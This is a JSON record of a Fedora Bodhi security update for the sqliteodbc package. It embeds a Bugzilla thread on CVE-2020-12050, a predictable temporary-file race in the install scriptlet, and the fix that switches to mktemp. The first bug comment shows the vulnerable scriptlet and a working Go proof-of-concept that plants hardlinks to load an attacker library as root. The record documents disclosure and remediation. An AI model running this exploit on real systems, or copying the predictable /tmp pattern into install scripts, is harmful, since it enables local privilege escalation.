@@ -1,0 +1,533 @@
+{
+	"alias": "FEDORA-2020-c98c7da2f6",
+	"autokarma": true,
+	"autotime": true,
+	"bugs": [
+		{
+			"bug_id": 1825762,
+			"title": "Packaging vulnerability in sqliteODBC exposing to local privilege escalation to root",
+			"bugzilla": {
+				"bug_id": "1825762",
+				"creation_ts": "2020-04-20 07:50:07 +0000",
+				"short_desc": "Packaging vulnerability in sqliteODBC exposing to local privilege escalation to root",
+				"delta_ts": "2020-05-01 04:05:32 +0000",
+				"bug_status": "CLOSED",
+				"resolution": "ERRATA",
+				"priority": "unspecified",
+				"bug_severity": "medium",
+				"long_desc": [
+					{
+						"isprivate": "0",
+						"commentid": "13817264",
+						"comment_count": "0",
+						"who": {
+							"text": "labs",
+							"name": "Sysdream"
+						},
+						"bug_when": "2020-04-20 07:50:07 +0000",
+						"thetext": "A vulnerability has been introduced in the package that installs sqliteODBC in Red Hat / CentOS / Fedora distributions.\n\n**Threat** \n\nPrivilege escalation to root\n\n## Vulnerability records\n\n**CVE ID**: CVE-YYYY-XXX\n\n**Access Vector**: local\n\n**Security Risk**: low\n\n**Vulnerability**: CWE-377\n\n**CVSS Base Score**: 4.5\n\n**CVSS Vector**: CVSS:3.0/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L\n\n\n\n## Details\n\nThe sqliteODBC package install script saves a part of his configuration file in the `/tmp` folder, before running the `odbcinstall` script on it:\n\n```\nif [ -x /usr/bin/odbcinst ] ; then\n\tINST=/tmp/sqliteodbcinst$$\n\n\tif [ -r /usr/lib64/libsqliteodbc.so ] ; then\n\t\tcat > $INST <<- 'EOD'\n\t\t\t[SQLITE]\n\t\t\tDescription=SQLite ODBC 2.X\n\t\t\tDriver=/usr/lib64/libsqliteodbc.so\n\t\t\tSetup=/usr/lib64/libsqliteodbc.so\n\t\t\tThreading=2\n\t\t\tFileUsage=1\n\t\tEOD\n\n\t\t/usr/bin/odbcinst -q -d -n SQLITE | grep '^\\[SQLITE\\]' >/dev/null || {\n\t\t\t/usr/bin/odbcinst -i -d -n SQLITE -f $INST || true\n\t\t}\n\n```\n\nThe temporary configuration file is saved during the installation using the following name `/tmp/sqliteodbc$$` (where $$ is the PID of the process).\n\nAs the configuration file is using a predictable name, we can try to perform a race in order to write new contents before the file is loaded by `odbcinstall`.\n\nThe PID of a process is incremental, so we just have to pre-create a bunch of *hardlinks* in the `/tmp` directory that target our payload.\n\n## Proof of Concept\n\nWe created the following Golang exploit code, that works nearly all the time during the installation of sqliteodbc:\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc SpreadHardlinks(pid int) {\n\tmaxPid := pid + 100\n\tfmt.Println(\"[+] Creating hardlinks...\")\n\tfor pid++ ; pid < maxPid; pid++ {\n\t\ttarget := fmt.Sprintf(\"/tmp/sqliteodbcinst%d\", pid)\n\t\terr := os.Link(\"/tmp/race.ini\", target)\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\tfmt.Printf(\"[~] Created hardlink : %s\\n\", target)\n\t}\n}\n\nfunc main(){\n\tconst poc = `\n[default]\nDescription=Sysdream ODBC\nDriver=/tmp/poc.so\nDriver64=/tmp/poc.so\nSetup=/tmp/poc.so\nSetup64=/tmp/poc.so\nThreading=2\nFileUsage=1\n`\n\tpid := os.Getpid()\n\tfmt.Printf(\"[~] Current pid : %d\\n\", pid)\n\n\tfmt.Println(\"[+] Attempting to win the race, watch for changes in /etc/odbcinstall.conf !\")\n\n\tf, err := os.OpenFile(\"/tmp/race.ini\", os.O_CREATE | os.O_RDWR, 0700)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tSpreadHardlinks(pid)\n\n\tfor {\n\t\tf.Seek(0, 0)\n\t\tf.WriteString(poc)\n\t\tf.Sync()\n\t}\n\n\tf.Close()\n}\n```\n\nThat way, every time a program tries to use unixODBC, the `/tmp/poc.so` library will be loaded, enabling privilege escalation to the attacker.\n\n\n## Affected versions\n\n* Tested on sqliteodbc-0.9996-4.fc31.x86_64.rpm"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13817283",
+						"comment_count": "1",
+						"who": {
+							"text": "labs",
+							"name": "Sysdream"
+						},
+						"bug_when": "2020-04-20 07:58:24 +0000",
+						"thetext": "Note that we are posting here because we have never received any non automated reply from secalert@redhat.com.\n\nFirst contact on 2020/03/24, second request on 2020/04/16."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13818074",
+						"comment_count": "2",
+						"who": {
+							"text": "dwrobel",
+							"name": "Damian Wrobel"
+						},
+						"bug_when": "2020-04-20 12:01:13 +0000",
+						"thetext": "(In reply to Sysdream from comment #1)\n> Note that we are posting here because we have never received any non\n> automated reply from secalert@redhat.com.\n> \n> First contact on 2020/03/24, second request on 2020/04/16.\n\nFor me it also the first time I've received any information related to that issue.\n\n\n>As the configuration file is using a predictable name, we can try to perform a race in order to write new contents before the file is loaded by `odbcinstall`.\n\nBut, if I'm not mistaken in order to modify the content of that temporary file you need to have a root privileges anyway (unless RPM uses a wrong umask)."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13818297",
+						"comment_count": "3",
+						"who": {
+							"text": "labs",
+							"name": "Sysdream"
+						},
+						"bug_when": "2020-04-20 12:49:55 +0000",
+						"thetext": "> For me it also the first time I've received any information related to that issue.\n\nThen, there is a big problem with the alerting process, that might be worth investigation on the side of Red Hat.\n\n> But, if I'm not mistaken in order to modify the content of that temporary file you need to have a root privileges anyway (unless RPM uses a wrong umask).\n\nThe problem is that such a race condition enables code injection, which can lead to unexpected consequences for the user that blindly install the package.\n\nNote that the offensive file can be precreated by anyone and is not affected by the `umask` of the package or anything else.\n\nBy the way, as Red Had is CNA, can you provide us with a CVE?"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13818418",
+						"comment_count": "4",
+						"who": {
+							"text": "dwrobel",
+							"name": "Damian Wrobel"
+						},
+						"bug_when": "2020-04-20 13:13:55 +0000",
+						"thetext": "(In reply to Sysdream from comment #3)\n> \n> Note that the offensive file can be precreated by anyone and is not affected\n> by the `umask` of the package or anything else.\n\nMy understanding is that, whatever you injected to that file, prior to installing the sqliteODBC package, will be overwritten by the RPM unconditionally."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13818454",
+						"comment_count": "5",
+						"who": {
+							"text": "labs",
+							"name": "Sysdream"
+						},
+						"bug_when": "2020-04-20 13:21:58 +0000",
+						"thetext": "You misunderstand the principle of a \"race condition\".\n\nIt's a race that, for instance, the provided Go script tries to win.\n\nI think our PoC and the script are pretty self-explanatory, moreover you can test it easily."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13818522",
+						"comment_count": "6",
+						"who": {
+							"text": "dwrobel",
+							"name": "Damian Wrobel"
+						},
+						"bug_when": "2020-04-20 13:32:43 +0000",
+						"thetext": "(In reply to Sysdream from comment #5)\n> You misunderstand the principle of a \"race condition\".\nIMHO option I assume I know what is possibly the race condition. But I do not see a clear root escalation path if in order to modify this temp. file you need to also have a root privileges."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13819178",
+						"comment_count": "7",
+						"who": {
+							"text": "labs",
+							"name": "Sysdream"
+						},
+						"bug_when": "2020-04-20 15:48:37 +0000",
+						"thetext": "Created attachment 1680328\nPoC race condition\n\nOk, so please find here a video of the PoC.\n\nThink of a multi-user system where anyone can write to /tmp. Hopefully it's clear now.\n\nWill you provide a CVE or shall we contact MITRE as usual?"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13823470",
+						"comment_count": "8",
+						"who": {
+							"text": "dwrobel",
+							"name": "Damian Wrobel"
+						},
+						"bug_when": "2020-04-21 16:26:51 +0000",
+						"thetext": "(In reply to Sysdream from comment #7)\n> Created attachment 1680328 [details]\n> PoC race condition\n> \n> Ok, so please find here a video of the PoC.\nThank you for the video, but that wasn't the information I was looking for.\n\nLooking at the scriptlet it seems that the root cause is in the bash here-doc which does not recreate the file if it already exists - it just overwrites its content.\nSo I'll rewrite the scriptlet to create the temp. file using mktemp(1).\n\nFYI, the code is taken from the original upstream srpm[1].\n\n> Will you provide a CVE or shall we contact MITRE as usual?\nI'm not aware of that process, so please follow usual steps.\n\n[1] http://www.ch-werner.de/sqliteodbc/sqliteodbc-0.9996-1.src.rpm"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13825338",
+						"comment_count": "9",
+						"who": {
+							"text": "labs",
+							"name": "Sysdream"
+						},
+						"bug_when": "2020-04-22 06:53:32 +0000",
+						"thetext": "This will be CVE-2020-12050, so please refer to it in your changelog.\n\nWhen is the fix going to reach users in main repos?"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13827061",
+						"comment_count": "10",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-22 14:41:22 +0000",
+						"thetext": "FEDORA-2020-df7c647fa3 has been submitted as an update to Fedora 32. https://bodhi.fedoraproject.org/updates/FEDORA-2020-df7c647fa3"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13827104",
+						"comment_count": "11",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-22 14:46:03 +0000",
+						"thetext": "FEDORA-2020-c98c7da2f6 has been submitted as an update to Fedora 31. https://bodhi.fedoraproject.org/updates/FEDORA-2020-c98c7da2f6"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13827106",
+						"comment_count": "12",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-22 14:46:56 +0000",
+						"thetext": "FEDORA-2020-1e85425a52 has been submitted as an update to Fedora 30. https://bodhi.fedoraproject.org/updates/FEDORA-2020-1e85425a52"
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13828279",
+						"comment_count": "13",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-22 20:14:24 +0000",
+						"thetext": "FEDORA-2020-1e85425a52 has been pushed to the Fedora 30 testing repository.\nIn short time you'll be able to install the update with the following command:\n`sudo dnf upgrade --enablerepo=updates-testing --advisory=FEDORA-2020-1e85425a52`\nYou can provide feedback for this update here: https://bodhi.fedoraproject.org/updates/FEDORA-2020-1e85425a52\n\nSee also https://fedoraproject.org/wiki/QA:Updates_Testing for more information on how to test updates."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13828388",
+						"comment_count": "14",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-22 20:29:19 +0000",
+						"thetext": "FEDORA-2020-c98c7da2f6 has been pushed to the Fedora 31 testing repository.\nIn short time you'll be able to install the update with the following command:\n`sudo dnf upgrade --enablerepo=updates-testing --advisory=FEDORA-2020-c98c7da2f6`\nYou can provide feedback for this update here: https://bodhi.fedoraproject.org/updates/FEDORA-2020-c98c7da2f6\n\nSee also https://fedoraproject.org/wiki/QA:Updates_Testing for more information on how to test updates."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13832128",
+						"comment_count": "15",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-23 20:45:29 +0000",
+						"thetext": "FEDORA-2020-df7c647fa3 has been pushed to the Fedora 32 testing repository.\nIn short time you'll be able to install the update with the following command:\n`sudo dnf upgrade --enablerepo=updates-testing --advisory=FEDORA-2020-df7c647fa3`\nYou can provide feedback for this update here: https://bodhi.fedoraproject.org/updates/FEDORA-2020-df7c647fa3\n\nSee also https://fedoraproject.org/wiki/QA:Updates_Testing for more information on how to test updates."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13858910",
+						"comment_count": "16",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-30 02:51:12 +0000",
+						"thetext": "FEDORA-2020-1e85425a52 has been pushed to the Fedora 30 stable repository.\nIf problem still persists, please make note of it in this bug report."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13859003",
+						"comment_count": "17",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-04-30 03:43:12 +0000",
+						"thetext": "FEDORA-2020-c98c7da2f6 has been pushed to the Fedora 31 stable repository.\nIf problem still persists, please make note of it in this bug report."
+					},
+					{
+						"isprivate": "0",
+						"commentid": "13867475",
+						"comment_count": "18",
+						"who": {
+							"text": "updates",
+							"name": "Fedora Update System"
+						},
+						"bug_when": "2020-05-01 04:05:32 +0000",
+						"thetext": "FEDORA-2020-df7c647fa3 has been pushed to the Fedora 32 stable repository.\nIf problem still persists, please make note of it in this bug report."
+					}
+				]
+			}
+		}
+	],
+	"builds": [
+		{
+			"epoch": 0,
+			"nvr": "sqliteodbc-0.9996-6.fc31",
+			"release_id": 33,
+			"signed": true,
+			"type": "rpm",
+			"package": {
+				"aarch64": [
+					{
+						"name": "sqliteodbc-debuginfo",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "aarch64"
+					},
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "aarch64"
+					},
+					{
+						"name": "sqliteodbc-debugsource",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "aarch64"
+					}
+				],
+				"armv7hl": [
+					{
+						"name": "sqliteodbc-debuginfo",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "armv7hl"
+					},
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "armv7hl"
+					},
+					{
+						"name": "sqliteodbc-debugsource",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "armv7hl"
+					}
+				],
+				"i686": [
+					{
+						"name": "sqliteodbc-debugsource",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "i686"
+					},
+					{
+						"name": "sqliteodbc-debuginfo",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "i686"
+					},
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "i686"
+					}
+				],
+				"ppc64le": [
+					{
+						"name": "sqliteodbc-debugsource",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "ppc64le"
+					},
+					{
+						"name": "sqliteodbc-debuginfo",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "ppc64le"
+					},
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "ppc64le"
+					}
+				],
+				"s390x": [
+					{
+						"name": "sqliteodbc-debuginfo",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "s390x"
+					},
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "s390x"
+					},
+					{
+						"name": "sqliteodbc-debugsource",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "s390x"
+					}
+				],
+				"src": [
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "src"
+					}
+				],
+				"x86_64": [
+					{
+						"name": "sqliteodbc-debugsource",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "x86_64"
+					},
+					{
+						"name": "sqliteodbc",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "x86_64"
+					},
+					{
+						"name": "sqliteodbc-debuginfo",
+						"version": "0.9996",
+						"release": "6.fc31",
+						"arch": "x86_64"
+					}
+				]
+			}
+		}
+	],
+	"close_bugs": true,
+	"comments": [
+		{
+			"id": 1339588,
+			"text": "This update has been submitted for testing by dwrobel. ",
+			"timestamp": "2020-04-22 14:45:59",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		},
+		{
+			"id": 1339589,
+			"text": "This update's test gating status has been changed to 'waiting'.",
+			"timestamp": "2020-04-22 14:45:59",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		},
+		{
+			"id": 1339590,
+			"text": "This update's test gating status has been changed to 'ignored'.",
+			"timestamp": "2020-04-22 14:46:03",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		},
+		{
+			"id": 1340283,
+			"text": "This update has been pushed to testing.",
+			"timestamp": "2020-04-22 20:29:41",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		},
+		{
+			"id": 1349888,
+			"text": "This update can be pushed to stable now if the maintainer wishes",
+			"timestamp": "2020-04-29 20:28:32",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		},
+		{
+			"id": 1349889,
+			"text": "This update has been submitted for stable by bodhi. ",
+			"timestamp": "2020-04-29 20:28:32",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		},
+		{
+			"id": 1350452,
+			"text": "This update has been pushed to stable.",
+			"timestamp": "2020-04-30 03:43:32",
+			"update_id": 201922,
+			"user": {
+				"avatar": "https://apps.fedoraproject.org/img/icons/bodhi-24.png",
+				"id": 91,
+				"name": "bodhi",
+				"openid": "bodhi.id.fedoraproject.org"
+			},
+			"user_id": 91
+		}
+	],
+	"content_type": "rpm",
+	"date_pushed": "2020-04-30 03:42:10",
+	"date_stable": "2020-04-30 03:42:10",
+	"date_submitted": "2020-04-22 14:45:58",
+	"date_testing": "2020-04-22 20:27:35",
+	"meets_testing_requirements": true,
+	"notes": "Fix CVE-2020-12050 (use mktemp(1) for temp. file name creation)",
+	"pushed": true,
+	"release": {
+		"branch": "f31",
+		"candidate_tag": "f31-updates-candidate",
+		"composed_by_bodhi": true,
+		"create_automatic_updates": false,
+		"dist_tag": "f31",
+		"id_prefix": "FEDORA",
+		"long_name": "Fedora 31",
+		"mail_template": "fedora_errata_template",
+		"name": "F31",
+		"override_tag": "f31-override",
+		"package_manager": "dnf",
+		"pending_signing_tag": "f31-signing-pending",
+		"pending_stable_tag": "f31-updates-pending",
+		"pending_testing_tag": "f31-updates-testing-pending",
+		"stable_tag": "f31-updates",
+		"state": "archived",
+		"testing_repository": "updates-testing",
+		"testing_tag": "f31-updates-testing",
+		"version": "31"
+	},
+	"require_bugs": true,
+	"require_testcases": true,
+	"requirements": "",
+	"severity": "low",
+	"stable_days": 7,
+	"stable_karma": 3,
+	"status": "stable",
+	"suggest": "unspecified",
+	"test_gating_status": "ignored",
+	"title": "sqliteodbc-0.9996-6.fc31",
+	"type": "security",
+	"url": "https://bodhi.fedoraproject.org/updates/FEDORA-2020-c98c7da2f6",
+	"unstable_karma": -3,
+	"updateid": "FEDORA-2020-c98c7da2f6",
+	"user": {
+		"avatar": "https://seccdn.libravatar.org/avatar/209187429ade63ecce7f02e2d4d3c979aa3dba59b7d61c847d1896b6eb40686e?s=24&d=retro",
+		"email": "dwrobel@ertelnet.rybnik.pl",
+		"groups": [
+			{
+				"name": "packager"
+			},
+			{
+				"name": "ipausers"
+			},
+			{
+				"name": "fedora-contributor"
+			},
+			{
+				"name": "signed_fpca"
+			},
+			{
+				"name": "fedorabugs"
+			}
+		],
+		"id": 894,
+		"name": "dwrobel",
+		"openid": "dwrobel.id.fedoraproject.org"
+	},
+	"version_hash": "8c763665596c0d4c902c6d30d7228e92e6b7a383"
+}
